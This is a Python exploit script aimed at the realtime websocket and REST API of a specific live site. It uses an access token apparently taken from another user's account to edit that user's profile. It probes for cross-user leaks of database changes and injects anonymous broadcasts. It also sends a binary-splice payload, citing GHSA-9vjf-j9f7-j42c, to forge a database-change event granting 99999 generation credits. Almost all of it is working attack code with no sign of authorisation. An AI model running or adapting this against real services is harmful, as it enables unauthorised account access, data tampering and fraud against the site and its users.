#!/usr/bin/env python3
# Realtime angle probe: WS RLS tests for postgres_changes, private channels, public broadcast injection,
# and binary-splice / forged postgres_changes attempt (GHSA-9vjf-j9f7-j42c, V1 serializer).
import base64, json, os, socket, ssl, struct, sys, time, random, urllib.request, urllib.error
sys.stdout.reconfigure(encoding="utf-8")

HOST = "cdn.onlyfakeai.ru"
PK = "<publishable-key>"
TA = json.load(open("their_token.txt"))["access_token"]     # account A (sevillajames)
TB = json.load(open("token.txt"))["access_token"]           # account B
UIDA = "<redacted-user-uuid>"
UIDB = "23bd19c0-2588-4354-8ef1-fdc07ce1fd8c"

def rest_patch_remarks(tok, uid, val):
    req = urllib.request.Request(
        f"https://{HOST}/rest/v1/profiles?user_id=eq.{uid}",
        data=json.dumps({"remarks": val}).encode(),
        headers={"apikey": PK, "Authorization": "Bearer " + tok,
                 "Content-Type": "application/json", "Prefer": "return=minimal"},
        method="PATCH")
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code

class WS:
    def __init__(self, label):
        self.label = label
        self.buf = b""
        self.sock = None
    def connect(self):
        ctx = ssl.create_default_context()
        raw = socket.create_connection((HOST, 443), timeout=15)
        self.sock = ctx.wrap_socket(raw, server_hostname=HOST)
        self.sock.settimeout(12)
        key = base64.b64encode(os.urandom(16)).decode()
        path = f"/realtime/v1/websocket?apikey={PK}&vsn=1.0.0"
        req = (f"GET {path} HTTP/1.1\r\nHost: {HOST}\r\nUpgrade: websocket\r\n"
               f"Connection: Upgrade\r\nSec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n"
               f"User-Agent: Mozilla/5.0\r\nOrigin: https://onlyfakeai.ru\r\n\r\n")
        self.sock.sendall(req.encode())
        hdrs = b""
        while b"\r\n\r\n" not in hdrs:
            chunk = self.sock.recv(4096)
            if not chunk: break
            hdrs += chunk
        head, _, rest = hdrs.partition(b"\r\n\r\n")
        self.buf = rest
        line = head.split(b"\r\n")[0].decode(errors="replace")
        print(f"[{self.label}] handshake: {line}")
        self.sock.settimeout(0.4)
        for l in head.split(b"\r\n")[1:]:
            ls = l.decode(errors="replace")
            if any(k in ls.lower() for k in ("sec-websocket", "x-", "server", "sb-")):
                print(f"[{self.label}]   {ls}")
        if "101" not in line:
            raise RuntimeError("no 101")
    def _send_frame(self, opcode, payload: bytes):
        mask = os.urandom(4)
        n = len(payload)
        hdr = bytes([0x80 | opcode])
        if n < 126:
            hdr += bytes([0x80 | n])
        elif n < 65536:
            hdr += bytes([0x80 | 126]) + struct.pack(">H", n)
        else:
            hdr += bytes([0x80 | 127]) + struct.pack(">Q", n)
        masked = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
        self.sock.sendall(hdr + mask + masked)
    def send_json(self, obj):
        self._send_frame(1, json.dumps(obj).encode())
    def send_binary(self, data: bytes):
        self._send_frame(2, data)
    def _read_exact(self, n, timeout):
        end = time.time() + timeout
        while len(self.buf) < n:
            remain = end - time.time()
            if remain <= 0:
                raise TimeoutError
            self.sock.settimeout(min(remain, 0.5))
            try:
                chunk = self.sock.recv(65536)
            except socket.timeout:
                continue
            if not chunk:
                raise ConnectionError("closed")
            self.buf += chunk
        out, self.buf = self.buf[:n], self.buf[n:]
        return out
    def recv(self, timeout=0.5):
        """return (opcode, payload) or None on timeout"""
        try:
            b1, b2 = self._read_exact(2, timeout)
        except (TimeoutError, socket.timeout):
            return None
        opcode = b1 & 0x0F
        masked = (b2 & 0x80) != 0
        ln = b2 & 0x7F
        if ln == 126:
            ln = struct.unpack(">H", self._read_exact(2, timeout))[0]
        elif ln == 127:
            ln = struct.unpack(">Q", self._read_exact(8, timeout))[0]
        mk = self._read_exact(4, timeout) if masked else b""
        payload = self._read_exact(ln, timeout) if ln else b""
        if masked:
            payload = bytes(c ^ mk[i % 4] for i, c in enumerate(payload))
        if opcode == 9:
            self._send_frame(10, payload)
            return self.recv(timeout)
        return opcode, payload
    def drain(self, seconds, tag=""):
        events = []
        end = time.time() + seconds
        while time.time() < end:
            f = self.recv(0.3)
            if f is None:
                continue
            op, data = f
            if op == 8:
                print(f"[{self.label}] CLOSE frame: {data[:200]}")
                break
            txt = data.decode("utf-8", "replace")
            if op == 2:
                print(f"[{self.label}] BINARY frame ({len(data)}B): {txt[:400]}")
            try:
                j = json.loads(txt)
            except Exception:
                print(f"[{self.label}] RAW {op}: {txt[:400]}")
                continue
            ev = j.get("event")
            if ev in ("phx_reply",):
                status = j.get("payload", {}).get("status")
                print(f"[{self.label}] phx_reply topic={j.get('topic')} ref={j.get('ref')} status={status} resp={json.dumps(j.get('payload',{}).get('response'))[:500]}")
            else:
                print(f"[{self.label}] EVENT {ev} topic={j.get('topic')} payload={json.dumps(j.get('payload'))[:700]}")
                events.append(j)
        return events
    def heartbeat(self, ref):
        self.send_json({"topic": "phoenix", "event": "heartbeat", "payload": {}, "ref": ref})
    def join(self, topic, config, token=None, ref="1"):
        payload = {"config": config}
        if token:
            payload["access_token"] = token
        self.send_json({"topic": topic, "event": "phx_join", "payload": payload, "ref": ref, "join_ref": ref})
    def close(self):
        try:
            self._send_frame(8, b"\x03\xe8")
            self.sock.close()
        except Exception:
            pass

def pg_config(event="UPDATE", table="profiles", schema="public"):
    return {"broadcast": {"self": False, "ack": False}, "presence": {"key": ""},
            "postgres_changes": [{"event": event, "schema": schema, "table": table}],
            "private": False}

print("=== T0: anon subscription to site channel realtime:profiles_changes (postgres_changes UPDATE public.profiles) ===")
w = WS("anon")
w.connect()
w.join("realtime:profiles_changes", pg_config(), token=None, ref="1")
w.drain(3.0)
print("[anon] trigger: PATCH A.remarks")
print("  PATCH status:", rest_patch_remarks(TA, UIDA, "rt-anon-probe"))
evs = w.drain(6.0)
print(f"[anon] postgres_changes events received: {len([e for e in evs if e.get('event')=='postgres_changes'])}")
w.close()
time.sleep(0.5)

print("\n=== T1: B-token subscription; update A's row (cross-user) then B's row (control) ===")
w = WS("Btoken")
w.connect()
w.join("realtime:profiles_changes", pg_config(), token=TB, ref="1")
w.drain(3.0)
print("[B] trigger: PATCH A.remarks (cross-user)")
print("  PATCH A status:", rest_patch_remarks(TA, UIDA, "rt-cross-probe"))
evs = w.drain(5.0)
cross = [e for e in evs if e.get('event') == 'postgres_changes']
print(f"[B] events after A-change: {len(cross)}; payloads: {json.dumps([e.get('payload') for e in cross])[:800]}")
print("[B] trigger: PATCH B.remarks (own row control)")
print("  PATCH B status:", rest_patch_remarks(TB, UIDB, "rt-own-probe"))
evs = w.drain(5.0)
own = [e for e in evs if e.get('event') == 'postgres_changes']
print(f"[B] events after B-change: {len(own)}; payloads: {json.dumps([e.get('payload') for e in own])[:800]}")
w.close()
time.sleep(0.5)

print("\n=== T2: private channel join tests ===")
for label, tok in (("anon", None), ("Btoken", TB)):
    w = WS("priv-" + label)
    try:
        w.connect()
        cfg = {"broadcast": {"self": False}, "presence": {"key": ""}, "private": True}
        w.join("realtime:supa-angle-private-test", cfg, token=tok, ref="1")
        w.drain(3.0)
    except Exception as e:
        print(f"[priv-{label}] error {e}")
    finally:
        w.close()
    time.sleep(0.4)

print("\n=== T3: public broadcast — can anon inject into the site's public channel? ===")
listener = WS("listener")
listener.connect()
listener.join("realtime:profiles_changes", {"broadcast": {"self": False}, "presence": {"key": ""}, "private": False}, token=TB, ref="1")
listener.drain(2.0)
injector = WS("injector")
injector.connect()
injector.join("realtime:profiles_changes", {"broadcast": {"self": False}, "presence": {"key": ""}, "private": False}, token=None, ref="1")
injector.drain(2.0)
injector.send_json({"topic": "realtime:profiles_changes", "event": "broadcast",
                    "payload": {"type": "broadcast", "event": "zz-injected", "payload": {"foo": "from-anon"}}, "ref": "9"})
time.sleep(1.0)
injector.send_json({"topic": "realtime:profiles_changes", "event": "broadcast",
                    "payload": {"type": "broadcast", "event": "zz-forged", "payload": {"bar": 1}}, "ref": "10"})
evs = listener.drain(4.0)
print(f"[listener] broadcast-ish events seen: {json.dumps(evs)[:1200]}")
injector.close()

print("\n=== T4: binary splice / forged postgres_changes attempt (GHSA-9vjf-j9f7-j42c) ===")
# V1 serializer: server inserts client binary payload unvalidated into outgoing JSON; try crafted fragment.
forged = (b'{"type":"broadcast","event":"zz","payload":{"x":1}},"event":"postgres_changes",'
          b'"payload":{"data":{"schema":"public","table":"profiles","commit_timestamp":"2026-11-11T00:00:00Z",'
          b'"event":"UPDATE","new":{"user_id":"00000000-0000-0000-0000-000000000000","generations_left":99999},'
          b'"old":{},"errors":null},"ids":[1]}}')
variants = [forged, b'{"type":"broadcast","event":"zz","payload":' + forged + b'}']
for i, payload in enumerate(variants):
    print(f"[splice] sending binary variant {i} ({len(payload)}B)")
    try:
        injector.send_binary(payload)
    except Exception as e:
        print("[splice] send err", e); break
    time.sleep(0.8)
    listener.drain(2.0, tag=f"variant{i}")
injector.close()
listener.close()

print("\n=== T5: restore remarks ===")
print("A:", rest_patch_remarks(TA, UIDA, None), "B:", rest_patch_remarks(TB, UIDB, "hi"))
print("done")
